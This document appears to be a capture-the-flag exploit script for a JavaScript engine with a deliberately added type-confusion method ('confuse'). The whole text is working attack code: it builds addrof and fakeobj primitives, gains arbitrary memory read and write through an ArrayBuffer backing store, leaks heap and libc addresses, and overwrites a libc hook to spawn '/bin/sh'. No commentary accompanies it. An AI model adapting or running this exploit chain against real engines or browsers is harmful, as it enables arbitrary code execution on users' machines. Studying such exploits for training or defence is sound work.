var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let DEBUG = false;

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function leak_all_addrof(obj) {
    let a = [obj];
//    if (DEBUG) %DebugPrint(obj)
    a.confuse();
    let leak = ftoi(a.at(0));
//    if (DEBUG) console.log("leak:    0x" + leak.toString(16));
    return [(leak & 0xffffffff00000000n) >> 32n, leak & 0xffffffffn]
}

function addrof(obj) {
    return leak_all_addrof(obj)[1]
}

function fakeobj(addr) {
    let array = [];
    array[0] = itof(addr);
    array.confuse();
    let fake_object = array[0];
    array.confuse();
    return fake_object;
}

function create_fake_object(addr) {
    // elements must start on 8 byte earlier (2 system variables)
    let elements_start_addr = addr - 0x8n;
    // Bit operations are required because of pointer compression
    let obj = [itof((0x725n << 32n) | (map)), itof((4n << 32n) | (elements_start_addr))];
    let elements_addr = addrof(obj) + 0x64n;
    return fakeobj(elements_addr);
}

function initial_arbitrary_read(addr) {
    let obj = create_fake_object(addr)
    return ftoi(obj[0])
}

function initial_arbitrary_write(addr, value) {
    let obj = create_fake_object(addr)
    obj[0] = itof(value)
}

function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let backing_store_addr = addrof(buf) + 0x24n;
    initial_arbitrary_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

function arb_read(addr) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let backing_store_addr = addrof(buf) + 0x24n;
    initial_arbitrary_write(backing_store_addr, addr);
    return dataview.getBigUint64(0, true);
}

let a = [1.1, 2.2];
var map = leak_all_addrof(a)[0];
console.log(`[+] Map: ${map.toString(16)}`);

var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);
var buf_addr = addrof(buf);
var backing_store_addr = buf_addr + 36n;

console.log(`[*] backing store addr: ${backing_store_addr.toString(16)}`);

let heap_addr = initial_arbitrary_read(backing_store_addr);
console.log(`[+] Heap addr leaked: ${heap_addr.toString(16)}`)

main_arena_addr = arb_read(heap_addr + 0x840n) - 0x1250n
console.log(`[+] Main arena addr leaked: ${main_arena_addr.toString(16)}`)

libc_addr = main_arena_addr - 0x1e7000n
console.log(`[+] Libc addr leaked: ${libc_addr.toString(16)}`)

arb_write(libc_addr + 0x1ee148n, libc_addr + 0x528f0n)
console.log("/bin/sh\x00")
